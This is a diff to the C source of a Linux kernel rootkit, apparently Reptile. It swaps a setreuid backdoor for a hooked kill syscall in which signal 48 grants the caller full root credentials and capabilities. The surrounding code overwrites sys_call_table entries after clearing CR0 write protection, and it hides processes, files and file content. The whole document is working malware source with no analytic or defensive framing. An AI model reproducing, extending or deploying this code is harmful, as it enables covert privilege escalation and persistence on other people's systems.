@@ -45,6 +45,7 @@
 #endif
 
 #define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
+#define SIGROOT		48
 #define SIGHIDEPROC 	49
 #define SIGHIDEREPTILE 	50
 #define SIGHIDECONTENT  51
@@ -57,13 +58,11 @@ atomic_t read_on;
 struct workqueue_struct *work_queue;
 static struct nf_hook_ops magic_packet_hook_options;
 
-asmlinkage int (*o_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int (*o_kill)(pid_t pid, int sig);
 asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 asmlinkage int (*o_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 asmlinkage ssize_t (*o_read)(int fd, void *buf, size_t nbytes);
 
-asmlinkage int l33t_setreuid(uid_t reuid, uid_t euid);
 asmlinkage int l33t_kill(pid_t pid, int sig);
 asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
@@ -412,19 +411,6 @@ unsigned long *generic_find_sys_call_table(void){
 	return NULL;
 }
 
-asmlinkage int l33t_setreuid(uid_t ruid, uid_t euid){
-
-	int ret = 0;
-
-    	if(ruid == MAGIC_ID_1 && euid == MAGIC_ID_2){
-        	commit_creds(prepare_kernel_cred(0));
-        	ret = o_setreuid(0, 0);
-    	} else {
-		ret = o_setreuid(ruid, euid);
-	}
-    	return ret;
-}
-
 asmlinkage int l33t_kill(pid_t pid, int sig){
 
 	struct task_struct *task;
@@ -442,6 +428,22 @@ asmlinkage int l33t_kill(pid_t pid, int sig){
 		case SIGHIDECONTENT:
 			if(hide_file_content) hide_file_content = 0;
 			else hide_file_content = 1;
+			break;
+		case SIGROOT:
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+                	current->uid   = 0;
+                	current->suid  = 0;
+                	current->euid  = 0;
+                	current->gid   = 0;
+                	current->egid  = 0;
+                	current->fsuid = 0;
+                	current->fsgid = 0;
+                	cap_set_full(current->cap_effective);
+                	cap_set_full(current->cap_inheritable);
+                	cap_set_full(current->cap_permitted);
+#else
+                	commit_creds(prepare_kernel_cred(0));
+#endif
 			break;
 		default:
 			return o_kill(pid, sig);
@@ -580,14 +582,12 @@ static int __init reptile_init(void) {
 	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
 	if(!sct) return -1;
 	
-	o_setreuid = (void *)sct[__NR_setreuid];
     	o_kill = (void *)sct[__NR_kill];
     	o_getdents64 = (void *)sct[__NR_getdents64];
     	o_getdents = (void *)sct[__NR_getdents];
     	o_read = (void *)sct[__NR_read];
 		
 	write_cr0(read_cr0() & (~0x10000));
-	sct[__NR_setreuid] = (unsigned long)l33t_setreuid;		
 	sct[__NR_kill] = (unsigned long)l33t_kill;		
 	sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
 	sct[__NR_getdents] = (unsigned long)l33t_getdents;		
@@ -614,12 +614,6 @@ static int __init reptile_init(void) {
 } 
 
 static void __exit reptile_exit(void) { 
-	if(o_setreuid){
-		write_cr0(read_cr0() & (~0x10000));
-		sct[__NR_setreuid] = (unsigned long)o_setreuid;
-		write_cr0(read_cr0() | 0x10000);
-	}
-
 	if(o_kill){
 		write_cr0(read_cr0() & (~0x10000));
 		sct[__NR_kill] = (unsigned long)o_kill;
